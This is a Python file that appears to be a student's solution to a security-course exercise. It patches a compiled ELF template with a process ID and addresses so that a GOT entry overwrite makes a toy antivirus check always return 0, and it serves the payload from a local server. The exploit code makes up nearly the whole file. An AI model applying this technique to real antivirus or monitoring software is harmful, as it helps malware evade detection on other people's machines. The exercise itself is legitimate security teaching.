import addresses
import evasion
import struct

class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to replace the GOT entry for check_if_virus.

        Reminder: We want to replace it with another function of a similar
        signature, that will return 0.

        Notes:
        1. You can assume we already compiled q3.c into q3.template.
        2. Use addresses.CHECK_IF_VIRUS_GOT, addresses.CHECK_IF_VIRUS_ALTERNATIVE
           (and addresses.address_to_bytes).

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q3.template'
        with open(PATH_TO_TEMPLATE, 'rb') as reader:
            q3_elf = bytearray(reader.read());

        pid_offset = 4104 
        check_if_virus_got_offset = 4108
        check_if_virus_alter_offset = 4112
    
        pid_lit_en = struct.pack("<I", pid)
        for i in range(len(pid_lit_en)):
            q3_elf[pid_offset+i] = pid_lit_en[i];

        check_if_virus_got_addr = addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_GOT)
        for i in range(len(check_if_virus_got_addr)):
            q3_elf[check_if_virus_got_offset + i] = check_if_virus_got_addr[i]

        check_if_virus_alter_addr = addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_ALTERNATIVE)
        for i in range(len(check_if_virus_alter_addr)):
            q3_elf[check_if_virus_alter_offset + i] = check_if_virus_alter_addr[i]

        return bytes(q3_elf)

    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
